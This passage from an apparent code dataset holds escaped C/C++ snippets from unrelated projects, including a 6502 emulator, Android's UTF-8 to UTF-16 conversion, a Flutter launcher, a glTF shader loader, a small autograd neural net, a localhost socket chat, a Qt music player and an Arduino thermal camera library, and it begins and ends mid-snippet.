INS_LDA_IM:{\n                    // byte retrieved comes immediately after instruction opcode\n                    Byte Value = FetchByte (Cycles, memory); // 1 clock cycle\n                    A = Value; // set accumulator to fetched value\n                    LDAStatus(); // default LDA flag setting\n                }break;\n\n\n                // execute the load immediate with zero page instruction\n                case INS_LDA_ZP:{\n                    Byte ZeroPageAddr = FetchByte (Cycles, memory); // 1 clock cycle\n                    A = ReadByte(Cycles, ZeroPageAddr, memory); // 1 clock cycle \n                    LDAStatus(); // default LDA flag setting\n\n                }break;\n\n                // get zero page address, add value of X register to it, and load immediate with the resulting address \n                case INS_LDA_ZPX:{\n                    Byte ZeroPageAddr = FetchByte(Cycles, memory); \n                    ZeroPageAddr += X; // doesnt handle overflow\n                    Cycles --; // clock cycle for addition\n                    A = ReadByte(Cycles, ZeroPageAddr, memory); // 1 clock cycle \n                    LDAStatus(); // default LDA flag setting\n                }break;\n\n                case INS_JSR:{\n                    Word SubAddress = FetchWord(Cycles, memory); //one cycle\n                    memory.WriteWord(PC - 1, SP, Cycles);\n                    Cycles--;\n                    PC = SubAddress;\n                    Cycles--;\n                }break;\n\n\n                default:\n                {\n                    printf(\"Instruction not handeled %d\", Ins);\n                }break;\n  ",
    "/* libs/cutils/strdup8to16.c\n**\n** Copyright 2006, The Android Open Source Project\n**\n** Licensed under the Apache License, Version 2.0 (the \"License\");\n** you may not use this file except in compliance with the License.\n** You may obtain a copy of the License at\n**\n**     http://www.apache.org/licenses/LICENSE-2.0\n**\n** Unless required by applicable law or agreed to in writing, software\n** distributed under the License is distributed on an \"AS IS\" BASIS,\n** WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n** See the License for the specific language governing permissions and\n** limitations under the License.\n*/\n\n#include \"jstring.h\"\n\n#include <assert.h>\n#include <limits.h>\n#include <stdlib.h>\n\n/* See http://www.unicode.org/reports/tr22/ for discussion\n * on invalid sequences\n */\n\n#define UTF16_REPLACEMENT_CHAR 0xfffd\n\n/* Clever trick from Dianne that returns 1-4 depending on leading bit sequence*/\n#define UTF8_SEQ_LENGTH(ch) (((0xe5000000 >> (((ch) >> 3) & 0x1e)) & 3) + 1)\n\n/* note: macro expands to multiple lines */\n#define UTF8_SHIFT_AND_MASK(unicode, byte)  \\\n            (unicode)<<=6; (unicode) |= (0x3f & (byte));\n\n#define UNICODE_UPPER_LIMIT 0x10fffd\n\n/**\n * out_len is an out parameter (which may not be null) containing the\n * length of the UTF-16 string (which may contain embedded \\0's)\n */\n\nextern char16_t * strdup8to16 (const char* s, size_t *out_len)\n{\n    char16_t *ret;\n    size_t len;\n\n    if (s == NULL) return NULL;\n\n    len = strlen8to16(s);\n\n    // fail on overflow\n    if (len && SIZE_MAX/len < sizeof(char16_t))\n        return NULL;\n\n    // no plus-one here. UTF-16 strings are not null terminated\n    ret = (char16_t *) malloc (sizeof(char16_t) * len);\n\n    return strcpy8to16 (ret, s, out_len);\n}\n\n/**\n * Like \"strlen\", but for strings encoded with Java's modified UTF-8.\n *\n * The value returned is the number of UTF-16 characters required\n * to represent this string.\n */\nextern size_t strlen8to16 (const char* utf8Str)\n{\n    size_t len = 0;\n    int ic;\n    int expected = 0;\n\n    while ((ic = *utf8Str++) != '\\0') {\n        /* bytes that start 0? or 11 are lead bytes and count as characters.*/\n        /* bytes that start 10 are extention bytes and are not counted */\n\n        if ((ic & 0xc0) == 0x80) {\n            /* count the 0x80 extention bytes. if we have more than\n             * expected, then start counting them because strcpy8to16\n             * will insert UTF16_REPLACEMENT_CHAR's\n             */\n            expected--;\n            if (expected < 0) {\n                len++;\n            }\n        } else {\n            len++;\n            expected = UTF8_SEQ_LENGTH(ic) - 1;\n\n            /* this will result in a surrogate pair */\n            if (expected == 3) {\n                len++;\n            }\n        }\n    }\n\n    return len;\n}\n\n\n\n/*\n * Retrieve the next UTF-32 character from a UTF-8 string.\n *\n * Stops at inner \\0's\n *\n * Returns UTF16_REPLACEMENT_CHAR if an invalid sequence is encountered\n *\n * Advances \"*pUtf8Ptr\" to the start of the next character.\n */\nstatic inline uint32_t getUtf32FromUtf8(const char** pUtf8Ptr)\n{\n    uint32_t ret;\n    int seq_len;\n    int i;\n\n    /* Mask for leader byte for lengths 1, 2, 3, and 4 respectively*/\n    static const unsigned char leaderMask[4] = {0xff, 0x1f, 0x0f, 0x07};\n\n    /* Bytes that start with bits \"10\" are not leading characters. */\n    if (((**pUtf8Ptr) & 0xc0) == 0x80) {\n        (*pUtf8Ptr)++;\n        return UTF16_REPLACEMENT_CHAR;\n    }\n\n    /* note we tolerate invalid leader 11111xxx here */\n    seq_len = UTF8_SEQ_LENGTH(**pUtf8Ptr);\n\n    ret = (**pUtf8Ptr) & leaderMask [seq_len - 1];\n\n    if (**pUtf8Ptr == '\\0') return ret;\n\n    (*pUtf8Ptr)++;\n    for (i = 1; i < seq_len ; i++, (*pUtf8Ptr)++) {\n        if ((**pUtf8Ptr) == '\\0') return UTF16_REPLACEMENT_CHAR;\n        if (((**pUtf8Ptr) & 0xc0) != 0x80) return UTF16_REPLACEMENT_CHAR;\n\n        UTF8_SHIFT_AND_MASK(ret, **pUtf8Ptr);\n    }\n\n    return ret;\n}\n\n\n/**\n * out_len is an out parameter (which may not be null) containing the\n * length of the UTF-16 string (which may contain embedded \\0's)\n */\n\nextern char16_t * strcpy8to16 (char16_t *utf16Str, const char*utf8Str,\n                                       size_t *out_len)\n{\n    char16_t *dest = utf16Str;\n\n    while (*utf8Str != '\\0') {\n        uint32_t ret;\n\n        ret = getUtf32FromUtf8(&utf8Str);\n\n        if (ret <= 0xffff) {\n            *dest++ = (char16_t) ret;\n        } else if (ret <= UNICODE_UPPER_LIMIT)  {\n            /* Create surrogate pairs */\n            /* See http://en.wikipedia.org/wiki/UTF-16/UCS-2#Method_for_code_points_in_Plane_1.2C_Plane_2 */\n\n            *dest++ = 0xd800 | ((ret - 0x10000) >> 10);\n            *dest++ = 0xdc00 | ((ret - 0x10000) &  0x3ff);\n        } else {\n            *dest++ = UTF16_REPLACEMENT_CHAR;\n        }\n    }\n\n    *out_len = dest - utf16Str;\n\n    return utf16Str;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"contactcard\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Model.h\"\n\nvoid Model::Draw(Renderer& renderer, const Vector2& position, float angle, float scale)\n{\n\tif (m_points.empty()) return;\n\n\trenderer.SetColor(Color::ToInt(m_color.r), Color::ToInt(m_color.g), Color::ToInt(m_color.b), Color::ToInt(m_color.a));\n\n\tfor (int i = 0; i < m_points.size() - 1; i++)\n\t{\n\t\tVector2 p1 = m_points[i].Rotate(angle) * scale + position;\n\t\tVector2 p2 = m_points[i + 1].Rotate(angle) * scale  + position;\n\n\t\trenderer.DrawLine(p1.x, p1.y, p2.x, p2.y);\n\t}\n}\n\nvoid Model::Draw(Renderer& renderer, const Transform transform)\n{\n\tif (m_points.empty()) return;\n\n\trenderer.SetColor(Color::ToInt(m_color.r), Color::ToInt(m_color.g), Color::ToInt(m_color.b), Color::ToInt(m_color.a));\n\n\tfor (int i = 0; i < m_points.size() - 1; i++)\n\t{\n\t\tVector2 p1 = m_points[i].Rotate(transform.rotation) * transform.scale + transform.position;\n\t\tVector2 p2 = m_points[i + 1].Rotate(transform.rotation) * transform.scale + transform.position;\n\n\t\trenderer.DrawLine(p1.x, p1.y, p2.x, p2.y);\n\t}\n}\n",
    "// cpp_songuyento.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\nusing namespace std;\n\nbool kiemtra(int so) {\n    int dem = 0;\n    for (int i = 1; i <= so; i++) {\n        if (so % i == 0) dem++;\n    }\n    if (dem == 2) return true;\n    return false;\n}\nint main()\n{\n    //Khai bao mang\n    int arr[5];\n    //Nhap du lieu vao mang\n    for (int i = 0; i < 5; i++) {\n        cout << \"Nhap phan tu thu \" << i << \" \";\n        cin >> arr[i];\n    }\n    //Hien mang\n    for (int i : arr) {\n        cout << i << \" \";\n    }\n    cout << \"\\n\";\n    //kiem tra\n    for (int i = 0; i < 5; i++) {\n        if (kiemtra(arr[i])) cout << arr[i] << \" \";\n    }\n    return 0;\n}\n\n// Run program: Ctrl + F5 or Debug > Start Without Debugging menu\n// Debug program: F5 or Debug > Start Debugging menu\n\n// Tips for Getting Started: \n//   1. Use the Solution Explorer window to add/manage files\n//   2. Use the Team Explorer window to connect to source control\n//   3. Use the Output window to see build output and other messages\n//   4. Use the Error List window to view errors\n//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project\n//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file\n",
    "#include <glad.h>\n#include <GLFW/glfw3.h>\n#include <iostream>\n#include \"tiny_gltf.h\"\n#include \"basic_types.hpp\"\n\nusing namespace std;\n\nstd::unordered_map<std::string, float> materialUniformFloats;\nstd::unordered_map<std::string, int> materialUniformInt;\nstd::unordered_map<std::string, Vector2> materialUniformVector2;\nstd::unordered_map<std::string, Vector3> materialUniformVector3;\nstd::unordered_map<std::string, Vector4> materialUniformVector4;\n\n\nstatic float getcurrentTime()\n{\n    return (float)glfwGetTime();\n}\n\nstatic void materialSetPropert(std::string uniformName, float value)\n{\n    if (materialUniformFloats.find(uniformName) != materialUniformFloats.end())\n    {\n        materialUniformFloats[uniformName] = value;\n    }\n}\nstatic void materialSetPropert(std::string uniformName, Vector4 value)\n{\n    if (materialUniformVector4.find(uniformName) != materialUniformVector4.end())\n    {\n        materialUniformVector4[uniformName] = value;\n    }\n}\n\nstatic void materialSetPropert(std::string uniformName, Vector3 value)\n{\n    if (materialUniformVector3.find(uniformName) != materialUniformVector3.end())\n    {\n        materialUniformVector3[uniformName] = value;\n    }\n}\n\nstatic void materialSetPropert(std::string uniformName, Vector2 value)\n{\n    if (materialUniformVector2.find(uniformName) != materialUniformVector2.end())\n    {\n        materialUniformVector2[uniformName] = value;\n    }\n}\n\nstatic void materialSetPropert(std::string uniformName, int value)\n{\n    if (materialUniformInt.find(uniformName) != materialUniformInt.end())\n    {\n        materialUniformInt[uniformName] = value;\n    }\n}\n\nstatic void materialUpdateProperties(GLuint materialProgram)\n{\n    for (auto& uniform : materialUniformFloats)\n    {\n        GLint uniformLocation = glGetUniformLocation(materialProgram, uniform.first.c_str());\n        if (uniformLocation != -1)\n        {\n            glUniform1f(uniformLocation, uniform.second);\n        }\n        std::cout << \"Uniform float: \" << uniform.first << \" = \" << uniform.second << std::endl;\n    }\n    for (auto& uniform : materialUniformVector4)\n    {\n        GLint uniformLocation = glGetUniformLocation(materialProgram, uniform.first.c_str());\n        if (uniformLocation != -1)\n        {\n            glUniform4f(uniformLocation, uniform.second.x, uniform.second.y, uniform.second.z, uniform.second.w);\n        }\n        std::cout << \"Uniform float: \" << uniform.first << \" = \" << uniform.second.x << \", \" << uniform.second.y << \", \" << uniform.second.z << \", \" << uniform.second.w << std::endl;\n    }\n    for (auto& uniform : materialUniformVector3)\n    {\n        GLint uniformLocation = glGetUniformLocation(materialProgram, uniform.first.c_str());\n        if (uniformLocation != -1)\n        {\n            glUniform3f(uniformLocation, uniform.second.x, uniform.second.y, uniform.second.z);\n        }\n        std::cout << \"Uniform float: \" << uniform.first << \" = \" << uniform.second.x << \", \" << uniform.second.y << \", \" << uniform.second.z << std::endl;\n    }\n    for (auto& uniform : materialUniformVector2)\n    {\n        GLint uniformLocation = glGetUniformLocation(materialProgram, uniform.first.c_str());\n        if (uniformLocation != -1)\n        {\n            glUniform2f(uniformLocation, uniform.second.x, uniform.second.y);\n        }\n        std::cout << \"Uniform float: \" << uniform.first << \" = \" << uniform.second.x << \", \" << uniform.second.y << std::endl;\n    }\n    for (auto& uniform : materialUniformInt)\n    {\n        GLint uniformLocation = glGetUniformLocation(materialProgram, uniform.first.c_str());\n        if (uniformLocation != -1)\n        {\n            glUniform1i(uniformLocation, uniform.second);\n        }\n        std::cout << \"Uniform int: \" << uniform.first << \" = \" << uniform.second << std::endl;\n    }\n\n}\nGLuint loadMaterial(tinygltf::Model& model,std::filesystem::path& gltfDirectory, unsigned int materialId)\n{\n\n    std::filesystem::path vertexShaderPath;\n    std::filesystem::path fragmentShadePath;\n     std::string vertexShaderSource;\n     std::string fragmentShaderSource;\n\n    const char* defaultVertexShaderSource =\n        #include \"vertexShader.glsl\"\n        ;\n\n    const char* defaultFragmentShaderSource =\n        #include \"fragmentShader.glsl\"\n        ;\n\n    if (materialId < model.materials.size())\n    {\n    auto gltfMaterialExtras = model.materials[materialId].extras;\n    if (gltfMaterialExtras.Has(\"shader\"))\n    {\n        auto gltfMaterialShader = gltfMaterialExtras.Get(\"shader\");\n        if (gltfMaterialShader.Has(\"vertex\"))\n        {\n            std::string gltfMaterialShaderVertex = gltfMaterialShader.Get(\"vertex\").Get<std::string>();\n            vertexShaderPath = gltfDirectory / gltfMaterialShaderVertex; \n        }\n        if (gltfMaterialShader.Has(\"fragment\"))\n        {\n            std::string gltfMaterialShaderFragment = gltfMaterialShader.Get(\"fragment\").Get<std::string>();\n            fragmentShadePath = gltfDirectory / gltfMaterialShaderFragment;\n        }\n        if (gltfMaterial",
    "struct Node {\n\tI32\tsize;\n\tValue\t*w;\n\tValue\tb;\n};\n\nstruct Layer {\n\tI32\tsize;\n\tNode\t*nodes;\n};\n\nstruct Net {\n\tI32\tsize;\n\tLayer\t*layers;\n};\n\n\n////////////////////////////////////////////////////////////////////////////////\n//// Initialization\n\ninternal void\ninitialize_node(Node *n, I32 size, Arena *a) {\n\tn->size = size;\n\tn->w = (Value *)arena_alloc(a, size * sizeof(Value));\n\tfor (I32 i = 0; i < size; ++i) {\n\t\tn->w[i] = vrand_uniform(-1.0f, 1.0f);\n\t}\n\tn->b = vrand_uniform(-1.0f, 1.0f);\n}\n\ninternal void\ninitialize_layer(Layer *l, I32 size, I32 nodesize, Arena *a) {\n\tl->size = size;\n\tl->nodes = (Node *)arena_alloc(a, size * sizeof(Node));\n\tfor (I32 i = 0; i < size; ++i) {\n\t\tinitialize_node(&l->nodes[i], nodesize, a);\n\t}\n}\n\ninternal void\ninitialize_net(Net *n, I32 size, I32 *layer_sizes, I32 input_size, Arena *a) {\n\tn->size = size;\n\tn->layers = (Layer *)arena_alloc(a, size * sizeof(Layer));\n\tinitialize_layer(&n->layers[0], layer_sizes[0], input_size, a);\n\tfor (I32 i = 1; i < size; ++i) {\n\t\tinitialize_layer(&n->layers[i], layer_sizes[i], layer_sizes[i-1], a);\n\t}\n}\n\n////////////////////////////////////////////////////////////////////////////////\n//// Forward pass\n\ninternal Value\nnode_forward(Node *n, Value *xs, Arena *a) {\n\tValue *sum = value(0.0f, a);\n\tfor (I32 i = 0; i < n->size; ++i) {\n\t\tValue *x_ = vmul(&n->w[i], &xs[i], a);\n\t\tsum = vadd(sum, x_, a);\n\t}\n\treturn vtanh(vadd(sum, &n->b, a));\n}\n\ninternal Value *\nlayer_forward(Layer *l, Value *input, Arena *a) {\n\tValue *o = (Value *)arena_alloc(a, l->size * sizeof(Value));\n\tfor (I32 i = 0; i < l->size; ++i) {\n\t\to[i] = node_forward(&l->nodes[i], input, a);\n\t}\n\treturn o;\n}\n\ninternal Value *\nnet_forward(Net *n, Value *xs, Arena *a) {\n\tValue *input = xs;\n\tfor (I32 i = 0; i < n->size; ++i) {\n\t\tinput = layer_forward(&n->layers[i], input, a);\n\t}\n\treturn input;\n}\n\n////////////////////////////////////////////////////////////////////////////////\n//// Backward pass\n\ninternal void\nbackward_(Value *y) {\n\tif (!y || y->op == OP_NONE) {\n\t\treturn;\n\t}\n\n\tValue *x1 = y->p1;\n\tValue *x2 = y->p2;\n\n\tswitch (y->op) {\n\t\tcase OP_ADD: {\n\t\t\tx1->grad += 1.0f * y->grad;\n\t\t\tx2->grad += 1.0f * y->grad;\n\t\t} break;\n\t\tcase OP_SUB: {\n\t\t\tx1->grad += 1.0f * y->grad;\n\t\t\tx2->grad += -1.0f * y->grad;\n\t\t} break;\n\t\tcase OP_MUL: {\n\t\t\tx1->grad += x2->data * y->grad;\n\t\t\tx2->grad += x1->data * y->grad;\n\t\t} break;\n\t\tcase OP_DIV: {\n\t\t\tx1->grad += 1.0f / x2->data * y->grad;\n\t\t\tx2->grad += (-x1->data / (x2->data * x2->data)) * y->grad;\n\t\t} break;\n\t\tcase OP_TANH: {\n\t\t\tx1->grad += (1.0f - y->data * y->data) * y->grad;\n\t\t} break;\n\t\tdefault: {\n\t\t\tprint_error(\"error: Unknown operation\\n\");\n\t\t} break;\n\t}\n\n\tbackward_(x1);\n\tbackward_(x2);\n}\n\ninternal void\nbackward(Value *y) {\n\ty->grad = 1.0f;\n\tbackward_(y);\n}\n\ninternal void\nnet_update_params(Net *net, F32 lr) {\n\tfor (I32 i_layer = 0; i_layer < net->size; ++i_layer) {\n\t\tLayer *layer = &net->layers[i_layer];\n\t\tfor (I32 i_node = 0; i_node < layer->size; ++i_node) {\n\t\t\tNode *node = &layer->nodes[i_node];\n\t\t\tfor (I32 i_w = 0; i_w < node->size; ++i_w) {\n\t\t\t\tnode->w[i_w].data += -lr * node->w[i_w].grad;\n\t\t\t\tnode->w[i_w].grad = 0.0f;\n\t\t\t}\n\t\t\tnode->b.data += -lr * node->b.grad;\n\t\t\tnode->b.grad = 0.0f;\n\t\t}\n\t}\n}\n\n",
    "#include <iostream>\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n#include <cstring>\n\n#define PORT 8080\n\nvoid server() {\n    int server_fd, new_socket;\n    struct sockaddr_in address;\n    int addrlen = sizeof(address);\n    char buffer[1024] = {0};\n\n    // Creating socket\n    server_fd = socket(AF_INET, SOCK_STREAM, 0);\n    if (server_fd == 0) {\n        perror(\"socket failed\");\n        exit(EXIT_FAILURE);\n    }\n\n    // Binding socket to port\n    address.sin_family = AF_INET;\n    address.sin_addr.s_addr = INADDR_ANY;\n    address.sin_port = htons(PORT);\n\n    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {\n        perror(\"bind failed\");\n        exit(EXIT_FAILURE);\n    }\n    if (listen(server_fd, 3) < 0) {\n        perror(\"listen\");\n        exit(EXIT_FAILURE);\n    }\n    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {\n        perror(\"accept\");\n        exit(EXIT_FAILURE);\n    }\n\n    std::string hello = \"\";\n    send(new_socket, hello.c_str(), hello.length(), 0);\n\n    // Communication loop\n    while (true) {\n        memset(buffer, 0, sizeof(buffer));\n        read(new_socket, buffer, 1024);\n        std::cout << \"Client: \" << buffer << std::endl;\n\n        std::string message;\n        std::getline(std::cin, message);\n        send(new_socket, message.c_str(), message.length(), 0);\n    }\n}\n\nvoid client() {\n    int sock = 0;\n    struct sockaddr_in serv_addr;\n    char buffer[1024] = {0};\n    \n    // Creating socket\n    sock = socket(AF_INET, SOCK_STREAM, 0);\n    if (sock < 0) {\n        std::cout << \"\\nSocket creation error\\n\";\n        return;\n    }\n\n    serv_addr.sin_family = AF_INET;\n    serv_addr.sin_port = htons(PORT);\n\n    // Convert IPv4 and IPv6 addresses from text to binary form\n    if (inet_pton(AF_INET, \"127.0.0.1\", &serv_addr.sin_addr) <= 0) {\n        std::cout << \"\\nInvalid address/ Address not supported \\n\";\n        return;\n    }\n\n    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {\n        std::cout << \"\\nConnection Failed \\n\";\n        return;\n    }\n\n    // Communication loop\n    while (true) {\n        std::string message;\n        std::getline(std::cin, message);\n        send(sock, message.c_str(), message.length(), 0);\n\n        memset(buffer, 0, sizeof(buffer));\n        read(sock, buffer, 1024);\n        std::cout << \"Server: \" << buffer << std::endl;\n    }\n}\n\nint main(int argc, char const *argv[]) {\n    if (argc != 2) {\n        std::cerr << \"Usage: \" << argv[0] << \" <server/client>\\n\";\n        return 1;\n    }\n\n    if (std::string(argv[1]) == \"server\") {\n        server();\n    } else if (std::string(argv[1]) == \"client\") {\n        client();\n    } else {\n        std::cerr << \"Invalid option. Use 'server' or 'client'\\n\";\n        return 1;\n    }\n\n    return 0;\n}\n",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include \"ui_lrcwidget.h\"\"\n#include<QDebug>\n#include <QFileDialog>\n#include \"lrcwidget.h\"\nbool MainWindow::eventFilter(QObject *watched, QEvent *event)\n{\n\n    // \u5904\u7406\u952e\u76d8\u6309\u952e\u4e8b\u4ef6\n    if (event->type() == QEvent::KeyPress) {\n        QKeyEvent *keyEvent = static_cast<QKeyEvent *>(event);\n        if (keyEvent->key() == Qt::Key_Delete && watched == ui->listWidget) {\n            delete ui->listWidget->takeItem(ui->listWidget->currentRow());\n            return true;\n        }\n    }\n\n    // \u5904\u7406\u6ed1\u5757\u70b9\u51fb\u4e8b\u4ef6\n    if (event->type() == QEvent::MouseButtonPress && watched == ui->sliderPosition) {\n\n        QMouseEvent *mouseEvent = static_cast<QMouseEvent *>(event);\n        // \u8ba1\u7b97\u9f20\u6807\u70b9\u51fb\u4f4d\u7f6e\u5bf9\u5e94\u7684\u503c\n\n        if (mouseEvent->button() == Qt::LeftButton)\t//\u5224\u65ad\u5de6\u952e\n        {\n\n            int clickedValue = ui->sliderPosition->minimum() + ((ui->sliderPosition->maximum() - ui->sliderPosition->minimum()) * mouseEvent->pos().x() / ui->sliderPosition->width());\n            qDebug() << \"\u89e6\u53d1\u4e86\u70b9\u51fb\u4e8b\u4ef6\uff0c\u4f4d\u7f6e\u4e3a:\" << clickedValue << Qt::endl;\n            ui->sliderPosition->setValue(clickedValue);\n            player->setPosition(clickedValue); // \u8bbe\u7f6e\u64ad\u653e\u5668\u4f4d\u7f6e\n\n            return true;\n\n        }\n\n    } else if (event->type() == QEvent::MouseMove && watched == ui->sliderPosition) {\n        qDebug() << \"\u89e6\u53d1\u4e86\u79fb\u52a8\u4e8b\u4ef6\" << Qt::endl;\n        QMouseEvent *mouseEvent = static_cast<QMouseEvent *>(event);\n        if (mouseEvent->buttons() & Qt::LeftButton) {\n            int draggedValue = ui->sliderPosition->minimum() + ((ui->sliderPosition->maximum() - ui->sliderPosition->minimum()) * mouseEvent->pos().x() / ui->sliderPosition->width());\n            ui->sliderPosition->setValue(draggedValue); // \u66f4\u65b0\u6ed1\u5757\u7684\u503c\n            player->setPosition(draggedValue); // \u8bbe\u7f6e\u64ad\u653e\u5668\u4f4d\u7f6e\n            return true;\n        }\n    }\n\n    return QMainWindow::eventFilter(watched, event);\n}\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n\n    QPixmap pixmap(\":/images/images/KK.jpg\");\n    ui->label->setPixmap(pixmap.scaled(ui->label->size(), Qt::KeepAspectRatio, Qt::SmoothTransformation));\n\n    isDragging == false;\n    setWindowFlags(Qt::FramelessWindowHint);\n    loadSavedMusic();\n    ui->listWidget->installEventFilter(this);\n    ui->sliderPosition->installEventFilter(this);\n    player = new QMediaPlayer(this);\n    lrcWidget = new lrcwidget(this);\n    //lrcWidget->raise();\n    lrcWidget->hide();\n    QAudioOutput *audioOutput = new QAudioOutput(this);\n    player->setAudioOutput(audioOutput);\n\n    searchWidget = new searchwidget(this);\n    searchWidget->resize(760, 405);  // \u8bbe\u7f6e\u5bbd\u5ea6\u548c\u9ad8\u5ea6\u4e3a500\u50cf\u7d20\n    searchWidget->move(11, 52);  // \u5c06searchWidget\u79fb\u52a8\u5230(100, 100)\u7684\u4f4d\u7f6e\n    searchWidget->hide();\n    networkManager = new QNetworkAccessManager(this);\n\n\n    connect(player, &QMediaPlayer::positionChanged, this, &MainWindow::do_positionChanged);\n    connect(player, &QMediaPlayer::durationChanged, this, &MainWindow::do_durationChanged);\n    connect(player, &QMediaPlayer::sourceChanged, this, &MainWindow::do_sourceChanged);\n    connect(player, &QMediaPlayer::playbackStateChanged, this, &MainWindow::do_playbackStateChanged);\n    connect(player, &QMediaPlayer::metaDataChanged, this, &MainWindow::do_metaDataChanged);\n\n    //\u94fe\u63a5\u6b4c\u8bcd\u754c\u9762\n    connect(player, &QMediaPlayer::positionChanged, lrcWidget, &lrcwidget::updateLyrics);\n\n    //\u94fe\u63a5\u7f51\u7edc\u641c\u7d22\u6b4c\u66f2\n    connect(networkManager, &QNetworkAccessManager::finished, this, &MainWindow::onSearchFinished);\n\n    // \u94fe\u63a5 lrcwidget \u7684\u63a7\u4ef6\u4e0e MainWindow \u7684\u69fd\u51fd\u6570\n    connect(lrcWidget->getSlider(), &QSlider::sliderMoved, this, &MainWindow::lrcWidget_sliderMoved);\n    connect(lrcWidget->getPlayButton(), &QPushButton::clicked, this, &MainWindow::lrcWidget_playPauseToggled);\n    connect(lrcWidget->getPrevButton(), &QPushButton::clicked, this, &MainWindow::lrcWidget_prevClicked);\n    connect(lrcWidget->getNextButton(), &QPushButton::clicked, this, &MainWindow::lrcWidget_nextClicked);\n    connect(lrcWidget->getSoundSlider(), &QSlider::valueChanged, this, &MainWindow::lrcWidget_volumeChanged);\n    connect(lrcWidget->getSpeedSpinBox(), QOverload<double>::of(&QDoubleSpinBox::valueChanged), this, &MainWindow::lrcWidget_speedChanged);\n    connect(lrcWidget->getModeButton(), &QPushButton::clicked, this, &MainWindow::lrcWidget_modeChanged);\n\n    // \u8fde\u63a5 lrcwidget \u7684\u63a7\u4ef6\u4e0e MainWindow \u7684\u69fd\u51fd\u6570\n    connect(lrcWidget, &lrcwidget::sliderMoved, this, &MainWindow::lrcWidget_sliderMoved);\n    connect(lrcWidget, &lrcwidget::sliderPressed, this, &MainWindow::lrcWidget_sliderPressed);\n    connect(lrcWidget, &lrcwidget::sliderReleased, this, &MainWindow::lrcWidget_sliderReleased);\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\n\nvoid MainWindow::lrcWidget_sliderMoved(int value)\n{\n    qDebug() << \"Slider moved to\" << value;\n    player->setPosition(value);\n}\n\nvoid MainWindow::lrcWidget_playPauseToggled()\n{\n    qDebug() << \"Play/Pause toggled\";\n    if (player->playbackState() == QMediaPlayer::PlayingState) {\n        player->pause();\n    } else {\n        playe",
    "/*  Arduino Library for the Lepton FLiR Thermal Camera Module.\n    Copyright (c) 2016 NachtRaveVL      <nachtravevl@gmail.com>\n\n    Permission is hereby granted, free of charge, to any person\n    obtaining a copy of this software and associated documentation\n    files (the \"Software\"), to deal in the Software without\n    restriction, including without limitation the rights to use,\n    copy, modify, merge, publish, distribute, sublicense, and/or sell\n    copies of the Software, and to permit persons to whom the\n    Software is furnished to do so, subject to the following\n    conditions:\n\n    This permission notice shall be included in all copies or\n    substantial portions of the Software.\n\n    THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n    EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES\n    OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n    NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\n    HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n    WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n    FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\n    OTHER DEALINGS IN THE SOFTWARE.\n\n    Lepton-FLiR-Arduino - Version 0.9.91\n*/\n\n#include \"LeptonFLiR.h\"\n#if (defined(ARDUINO_ARCH_SAM) || defined(ARDUINO_ARCH_SAMD)) && !defined(LEPFLIR_DISABLE_SCHEDULER)\n#include \"Scheduler.h\"\n#define LEPFLIR_USE_SCHEDULER           1\n#endif\n\n#define LEPFLIR_GEN_CMD_TIMEOUT         5000        // Timeout for commands to be processed\n#define LEPFLIR_SPI_MAX_SPEED           20000000    // Maximum SPI speed for FLiR module\n#define LEPFLIR_SPI_MIN_SPEED           2200000     // Minimum SPI speed for FLiR module\n#define LEPFLIR_SPI_FRAME_PACKET_SIZE           164 // 2B ID + 2B CRC + 160B for 80x1 14bpp/8bppAGC thermal image data or telemetry data\n#define LEPFLIR_SPI_FRAME_PACKET_SIZE16         82\n\n#ifndef LEPFLIR_DISABLE_ALIGNED_MALLOC\nstatic inline int roundUpVal16(int val) { return ((val + 15) & -16); }\nstatic inline byte *roundUpPtr16(byte *ptr) { return ptr ? (byte *)(((uintptr_t)ptr + 15) & -16) : NULL; }\nstatic inline byte *roundUpMalloc16(int size) { return (byte *)malloc((size_t)(size + 15)); }\nstatic inline byte *roundUpSpiFrame16(byte *spiFrame) { return spiFrame ? 